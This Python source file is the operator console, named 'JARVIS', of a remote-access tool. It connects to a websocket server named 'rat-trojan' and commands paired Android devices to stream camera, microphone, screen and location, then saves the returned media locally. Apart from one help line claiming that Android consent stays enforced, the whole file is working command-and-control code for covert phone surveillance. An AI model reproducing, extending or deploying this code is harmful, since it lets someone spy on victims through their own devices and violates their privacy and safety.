
import asyncio
import json
import os
import platform
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

import websockets


# ============================================================
# CONFIG
# ============================================================

RENDER_URL = "wss://rat-trojan.onrender.com/ws"

PC_DEVICE_ID = "pc-main"

PAIRING_SECRET = os.getenv(
    "LAB_SECRET",
    "LAB-123456",
)

HEARTBEAT_INTERVAL = 10

RECONNECT_DELAY = 5


# ============================================================
# MEDIA DIRECTORIES
# ============================================================

BASE_DIR = Path(__file__).resolve().parent

RECEIVED_DIR = BASE_DIR / "received_data"

CAMERA_DIR = RECEIVED_DIR / "camera"

SCREEN_DIR = RECEIVED_DIR / "screens"

AUDIO_DIR = RECEIVED_DIR / "audio"

CAMERA_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

SCREEN_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

AUDIO_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ============================================================
# CAMERA SETTINGS
# ============================================================

CAMERA_SAVE_INTERVAL = 5.0

last_camera_save = 0.0

camera_window_enabled = True


# ============================================================
# STATE
# ============================================================

websocket = None

connected = False

registered = False

devices = {}

pending_requests = {}

pending_binary_metadata = None


# ============================================================
# LOCKS
# ============================================================

send_lock = asyncio.Lock()


# ============================================================
# UTILITY
# ============================================================

def now():
    return time.time()


def make_request_id():

    return uuid.uuid4().hex[:12]


def timestamp_string():

    return datetime.now().strftime(
        "%Y%m%d_%H%M%S_%f"
    )


def clear_screen():

    os.system(
        "cls"
        if os.name == "nt"
        else "clear"
    )


# ============================================================
# PC INFO
# ============================================================

def get_pc_info():

    return {
        "device_id": PC_DEVICE_ID,

        "device_type": "pc",

        "hostname":
            platform.node(),

        "platform":
            platform.system(),

        "platform_release":
            platform.release(),

        "platform_version":
            platform.version(),

        "architecture":
            platform.machine(),

        "processor":
            platform.processor(),

        "python_version":
            platform.python_version(),

        "agent_status":
            "active",

        "timestamp":
            now(),
    }


# ============================================================
# SEND JSON
# ============================================================

async def send_json(data):

    global websocket

    if websocket is None:
        return False

    try:

        async with send_lock:

            await websocket.send(
                json.dumps(data)
            )

        return True

    except Exception as exc:

        print(
            f"[SEND ERROR] {exc}"
        )

        return False


# ============================================================
# REGISTER PC
# ============================================================

async def register_pc():

    data = {
        "type": "pc_register",

        "secret":
            PAIRING_SECRET,

        "device_id":
            PC_DEVICE_ID,

        "device_type":
            "pc",

        "info":
            get_pc_info(),
    }

    return await send_json(
        data
    )


# ============================================================
# REQUEST DEVICE LIST
# ============================================================

async def request_devices():

    return await send_json(
        {
            "type":
                "list_devices"
        }
    )


# ============================================================
# HEARTBEAT
# ============================================================

async def heartbeat_loop():

    while connected:

        try:

            await asyncio.sleep(
                HEARTBEAT_INTERVAL
            )

            if not connected:
                break

            await send_json(
                {
                    "type":
                        "heartbeat",

                    "device_id":
                        PC_DEVICE_ID,

                    "timestamp":
                        now(),
                }
            )

        except asyncio.CancelledError:

            break

        except Exception as exc:

            print(
                f"[HEARTBEAT ERROR] {exc}"
            )

            break


# ============================================================
# COMMAND
# ============================================================

async def send_command(
    device_id,
    command,
    args=None,
):

    if not connected:

        print(
            "[ERROR] PC is not connected."
        )

        return None

    if not device_id:

        print(
            "[ERROR] Missing device ID."
        )

        return None

    if args is None:
        args = {}

    request_id = make_request_id()

    message = {
        "type":
            "command",

        "request_id":
            request_id,

        "device_id":
            device_id,

        "command":
            command,

        "args":
            args,

        "source_device_id":
            PC_DEVICE_ID,
    }

    pending_requests[
        request_id
    ] = {
        "device_id":
            device_id,

        "command":
            command,

        "created":
            now(),
    }

    sent = await send_json(
        message
    )

    if not sent:

        pending_requests.pop(
            request_id,
            None,
        )

        return None

    print(
        f"[COMMAND] "
        f"{command} → "
        f"{device_id}"
    )

    return request_id


# ============================================================
# PRINT DEVICES
# ============================================================

def print_devices():

    print()

    print(
        "DEVICES"
    )

    print(
        "=" * 80
    )

    if not devices:

        print(
            "No devices received."
        )

        print()

        return

    for device_id, device in devices.items():

        status = device.get(
            "status",
            "unknown",
        )

        device_type = device.get(
            "device_type",
            "unknown",
        )

        info = device.get(
            "info",
            {},
        )

        print(
            f"ID      : {device_id}"
        )

        print(
            f"TYPE    : {device_type}"
        )

        print(
            f"STATUS  : {status}"
        )

        if info:

            manufacturer = info.get(
                "manufacturer"
            )

            model = info.get(
                "model"
            )

            android_version = info.get(
                "android_version"
            )

            if manufacturer:
                print(
                    f"DEVICE  : "
                    f"{manufacturer} "
                    f"{model or ''}"
                )

            if android_version:
                print(
                    f"ANDROID : "
                    f"{android_version}"
                )

        print(
            "-" * 80
        )

    print()


# ============================================================
# DEVICE RESPONSE
# ============================================================

def handle_devices(data):

    global devices

    device_list = data.get(
        "devices",
        [],
    )

    devices = {}

    for device in device_list:

        device_id = device.get(
            "device_id"
        )

        if device_id:

            devices[
                device_id
            ] = device

    print_devices()


# ============================================================
# COMMAND RESPONSE
# ============================================================

def handle_command_response(data):

    request_id = data.get(
        "request_id"
    )

    success = data.get(
        "success",
        False,
    )

    if success:

        response_data = data.get(
            "data",
            {},
        )

        print()

        print(
            "[COMMAND OK]"
        )

        if response_data:

            print(
                json.dumps(
                    response_data,
                    indent=2,
                )
            )

        else:

            print(
                "Command completed."
            )

    else:

        error = data.get(
            "error",
            data.get(
                "message",
                "unknown_error",
            ),
        )

        print()

        print(
            f"[COMMAND FAILED] "
            f"{error}"
        )

    if request_id:

        pending_requests.pop(
            request_id,
            None,
        )


# ============================================================
# SAVE CAMERA FRAME
# ============================================================

def save_camera_frame(
    payload: bytes,
):

    global last_camera_save

    current = now()

    if (
        current -
        last_camera_save
        < CAMERA_SAVE_INTERVAL
    ):

        return

    filename = (
        f"camera_"
        f"{timestamp_string()}.jpg"
    )

    path = CAMERA_DIR / filename

    try:

        path.write_bytes(
            payload
        )

        last_camera_save = current

        print(
            f"[CAMERA] snapshot saved: "
            f"{path}"
        )

    except Exception as exc:

        print(
            f"[CAMERA SAVE ERROR] "
            f"{exc}"
        )


# ============================================================
# DISPLAY CAMERA
# ============================================================

def display_camera_frame(
    payload: bytes,
):

    if not camera_window_enabled:
        return

    try:

        import cv2
        import numpy as np

    except ImportError:

        return

    try:

        array = np.frombuffer(
            payload,
            dtype=np.uint8,
        )

        frame = cv2.imdecode(
            array,
            cv2.IMREAD_COLOR,
        )

        if frame is None:
            return

        cv2.imshow(
            "JARVIS Remote Camera",
            frame,
        )

        cv2.waitKey(1)

    except Exception as exc:

        print(
            f"[CAMERA DISPLAY ERROR] "
            f"{exc}"
        )


# ============================================================
# SAVE SCREEN FRAME
# ============================================================

def save_screen_frame(
    payload: bytes,
):

    filename = (
        f"screen_"
        f"{timestamp_string()}.jpg"
    )

    path = SCREEN_DIR / filename

    try:

        path.write_bytes(
            payload
        )

        print(
            f"[SCREEN] saved: "
            f"{path}"
        )

    except Exception as exc:

        print(
            f"[SCREEN SAVE ERROR] "
            f"{exc}"
        )


# ============================================================
# SAVE AUDIO
# ============================================================

def save_audio_chunk(
    payload: bytes,
):

    filename = (
        f"audio_"
        f"{timestamp_string()}.bin"
    )

    path = AUDIO_DIR / filename

    try:

        path.write_bytes(
            payload
        )

        print(
            f"[AUDIO] chunk saved: "
            f"{path}"
        )

    except Exception as exc:

        print(
            f"[AUDIO SAVE ERROR] "
            f"{exc}"
        )


# ============================================================
# MEDIA BINARY
# ============================================================

def handle_binary(
    payload: bytes,
):

    global pending_binary_metadata

    metadata = pending_binary_metadata

    pending_binary_metadata = None

    if metadata is None:

        print(
            "[MEDIA] binary received "
            "without metadata"
        )

        return

    media_type = metadata.get(
        "type",
        "unknown",
    )

    source_device = metadata.get(
        "source_device_id",
        "unknown",
    )

    print(
        f"[MEDIA] "
        f"{media_type} "
        f"from {source_device} "
        f"({len(payload)} bytes)"
    )

    # --------------------------------------------------------
    # CAMERA
    # --------------------------------------------------------

    if media_type == "camera_frame":

        display_camera_frame(
            payload
        )

        save_camera_frame(
            payload
        )

        return

    # --------------------------------------------------------
    # SCREEN
    # --------------------------------------------------------

    if media_type == "screen_frame":

        save_screen_frame(
            payload
        )

        return

    # --------------------------------------------------------
    # MICROPHONE
    # --------------------------------------------------------

    if media_type == "microphone_chunk":

        save_audio_chunk(
            payload
        )

        return

    print(
        f"[MEDIA] unknown type: "
        f"{media_type}"
    )


# ============================================================
# MESSAGE HANDLER
# ============================================================

async def handle_message(
    message,
):

    global pending_binary_metadata

    # ========================================================
    # BINARY
    # ========================================================

    if isinstance(
        message,
        bytes,
    ):

        handle_binary(
            message
        )

        return

    # ========================================================
    # JSON
    # ========================================================

    try:

        data = json.loads(
            message
        )

    except json.JSONDecodeError:

        print(
            "[ERROR] Invalid JSON "
            "received."
        )

        return

    message_type = data.get(
        "type"
    )

    # ========================================================
    # PC REGISTER RESPONSE
    # ========================================================

    if message_type == "pc_register_response":

        success = data.get(
            "success",
            False,
        )

        if success:

            global registered

            registered = True

            print(
                "[PC] Registered successfully."
            )

            await request_devices()

        else:

            print(
                "[PC] Registration failed:"
            )

            print(
                data.get(
                    "message",
                    "unknown",
                )
            )

        return

    # ========================================================
    # DEVICES
    # ========================================================

    if message_type == "devices":

        handle_devices(
            data
        )

        return

    # ========================================================
    # COMMAND RESPONSE
    # ========================================================

    if message_type == "command_response":

        handle_command_response(
            data
        )

        return

    # ========================================================
    # DEVICE INFO RESPONSE
    # ========================================================

    if message_type == "device_info_response":

        print()

        print(
            "[DEVICE INFO]"
        )

        print(
            json.dumps(
                data,
                indent=2,
            )
        )

        return

    # ========================================================
    # MEDIA METADATA
    # ========================================================

    if message_type in {
        "camera_frame",
        "screen_frame",
        "microphone_chunk",
    }:

        pending_binary_metadata = data

        return

    # ========================================================
    # HEARTBEAT
    # ========================================================

    if message_type == "heartbeat_response":

        return

    # ========================================================
    # PONG
    # ========================================================

    if message_type == "pong":

        return

    # ========================================================
    # ERROR
    # ========================================================

    if message_type == "error":

        print()

        print(
            "[SERVER ERROR]"
        )

        print(
            data.get(
                "message",
                data,
            )
        )

        return

    # ========================================================
    # UNKNOWN
    # ========================================================

    print()

    print(
        "[SERVER]"
    )

    print(
        json.dumps(
            data,
            indent=2,
        )
    )


# ============================================================
# RECEIVER LOOP
# ============================================================

async def receiver_loop():

    global connected
    global registered

    while connected:

        try:

            message = await websocket.recv()

            await handle_message(
                message
            )

        except asyncio.CancelledError:

            break

        except Exception as exc:

            print(
                f"[RECEIVER ERROR] "
                f"{exc}"
            )

            break


# ============================================================
# CONNECT
# ============================================================

async def connect():

    global websocket
    global connected
    global registered

    try:

        print(
            f"[CONNECT] "
            f"{RENDER_URL}"
        )

        websocket = await websockets.connect(
            RENDER_URL,

            ping_interval=20,

            ping_timeout=20,

            close_timeout=5,

            max_size=None,
        )

        connected = True
        registered = False

        print(
            "[CONNECTED]"
        )

        await register_pc()

        receiver_task = asyncio.create_task(
            receiver_loop()
        )

        heartbeat_task = asyncio.create_task(
            heartbeat_loop()
        )

        done, pending = await asyncio.wait(
            {
                receiver_task,
                heartbeat_task,
            },
            return_when=asyncio.FIRST_COMPLETED,
        )

        for task in pending:

            task.cancel()

        for task in done:

            try:

                await task

            except Exception:
                pass

    except Exception as exc:

        print(
            f"[CONNECTION ERROR] "
            f"{exc}"
        )

    finally:

        connected = False
        registered = False

        websocket = None

        print(
            "[DISCONNECTED]"
        )


# ============================================================
# CONNECTION MANAGER
# ============================================================

async def connection_loop():

    while True:

        await connect()

        print(
            f"[RECONNECT] "
            f"in {RECONNECT_DELAY} seconds..."
        )

        await asyncio.sleep(
            RECONNECT_DELAY
        )


# ============================================================
# HELP
# ============================================================

def print_help():

    print()

    print(
        "JARVIS COMMANDS"
    )

    print(
        "================================"
    )

    print(
        "devices"
    )

    print(
        "refresh"
    )

    print()

    print(
        "info <device_id>"
    )

    print(
        "battery <device_id>"
    )

    print(
        "status <device_id>"
    )

    print(
        "location <device_id>"
    )

    print()

    print(
        "screen-start <device_id>"
    )

    print(
        "screen-stop <device_id>"
    )

    print()

    print(
        "microphone-start <device_id>"
    )

    print(
        "microphone-stop <device_id>"
    )

    print()

    print(
        "camera-start <device_id>"
    )

    print(
        "camera-stop <device_id>"
    )

    print(
        "camera-front <device_id>"
    )

    print(
        "camera-back <device_id>"
    )

    print(
        "camera-switch <device_id>"
    )

    print(
        "camera-interval "
        "<device_id> <seconds>"
    )

    print()

    print(
        "clear"
    )

    print(
        "help"
    )

    print(
        "exit"
    )

    print()

    print(
        "Camera/microphone/screen commands "
        "are forwarded to Android, where "
        "Android permissions and consent "
        "remain enforced."
    )

    print()


# ============================================================
# COMMAND LINE
# ============================================================

async def cli_loop():

    print()

    print(
        "================================"
    )

    print(
        "        JARVIS PC AGENT"
    )

    print(
        "================================"
    )

    print(
        f"PC ID: {PC_DEVICE_ID}"
    )

    print(
        f"Server: {RENDER_URL}"
    )

    print()

    print_help()

    while True:

        try:

            command_line = await asyncio.to_thread(
                input,
                "JARVIS> ",
            )

        except EOFError:

            break

        except KeyboardInterrupt:

            print()

            break

        command_line = command_line.strip()

        if not command_line:
            continue

        parts = command_line.split()

        command = parts[0].lower()

        # ====================================================
        # EXIT
        # ====================================================

        if command == "exit":

            print(
                "Exiting..."
            )

            break

        # ====================================================
        # HELP
        # ====================================================

        if command == "help":

            print_help()

            continue

        # ====================================================
        # CLEAR
        # ====================================================

        if command == "clear":

            clear_screen()

            continue

        # ====================================================
        # DEVICES
        # ====================================================

        if command == "devices":

            print_devices()

            continue

        # ====================================================
        # REFRESH
        # ====================================================

        if command == "refresh":

            if not connected:

                print(
                    "[ERROR] Not connected."
                )

                continue

            await request_devices()

            continue

        # ====================================================
        # COMMANDS REQUIRING DEVICE ID
        # ====================================================

        commands_without_args = {
            "info":
                "device_info",

            "battery":
                "battery_status",

            "status":
                "connection_status",

            "location":
                "location_request",

            "screen-start":
                "start_screen",

            "screen-stop":
                "stop_screen",

            "microphone-start":
                "start_microphone",

            "microphone-stop":
                "stop_microphone",

            "camera-start":
                "start_camera",

            "camera-stop":
                "stop_camera",

            "camera-front":
                "camera_front",

            "camera-back":
                "camera_back",

            "camera-switch":
                "camera_switch",
        }

        if command in commands_without_args:

            if len(parts) != 2:

                print(
                    f"[USAGE] "
                    f"{command} <device_id>"
                )

                continue

            device_id = parts[1]

            server_command = (
                commands_without_args[
                    command
                ]
            )

            await send_command(
                device_id=
                    device_id,

                command=
                    server_command,
            )

            continue

        # ====================================================
        # CAMERA INTERVAL
        # ====================================================

        if command == "camera-interval":

            if len(parts) != 3:

                print(
                    "[USAGE] "
                    "camera-interval "
                    "<device_id> <seconds>"
                )

                continue

            device_id = parts[1]

            try:

                seconds = float(
                    parts[2]
                )

            except ValueError:

                print(
                    "[ERROR] "
                    "Seconds must be a number."
                )

                continue

            if seconds <= 0:

                print(
                    "[ERROR] "
                    "Seconds must be greater than 0."
                )

                continue

            global CAMERA_SAVE_INTERVAL

            CAMERA_SAVE_INTERVAL = seconds

            print(
                f"[CAMERA] PC snapshot "
                f"interval = "
                f"{seconds:g} seconds"
            )

            print(
                f"[CAMERA] Target device = "
                f"{device_id}"
            )

            continue

        # ====================================================
        # UNKNOWN
        # ====================================================

        print(
            f"[ERROR] Unknown command: "
            f"{command}"
        )

        print(
            "Type 'help' for commands."
        )


# ============================================================
# MAIN
# ============================================================

async def main():

    connection_task = asyncio.create_task(
        connection_loop()
    )

    try:

        await cli_loop()

    finally:

        connection_task.cancel()

        try:

            await connection_task

        except asyncio.CancelledError:

            pass

        except Exception:
            pass

        global connected

        connected = False

        try:

            import cv2

            cv2.destroyAllWindows()

        except Exception:
            pass


# ============================================================
# ENTRY
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()

        print(
            "JARVIS stopped."
        )

